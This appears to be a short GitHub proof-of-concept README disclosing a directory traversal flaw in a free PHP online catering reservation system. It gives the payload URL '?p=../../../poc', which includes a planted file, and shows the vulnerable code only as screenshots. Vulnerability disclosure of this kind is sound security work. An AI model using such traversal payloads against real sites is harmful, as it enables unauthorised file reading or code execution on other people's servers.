# Online-Catering-Reservation-DT

Exploit: Online-Catering-Reservation Directory Traversal Attack

Vendor/Source Code: https://www.sourcecodester.com/php/14896/online-catering-reservation-system-using-php-free-source-code.html

Website is hosted on C:\xampp\htdocs\catering\

poc.php (added to C:\ for this example)

![image](https://user-images.githubusercontent.com/88117535/128966086-eaa748b4-3374-4f4d-9038-6efb9a8ccd56.png)

Navigate to
http://localhost/catering/?p=../../../poc

![image](https://user-images.githubusercontent.com/88117535/128966196-9443f7d9-58c9-4279-a7af-794f4e51c309.png)

Vulnerable Code in index.php:

![image](https://user-images.githubusercontent.com/88117535/128966223-2bb0dbc5-2e58-4664-998f-66b23d60764c.png)
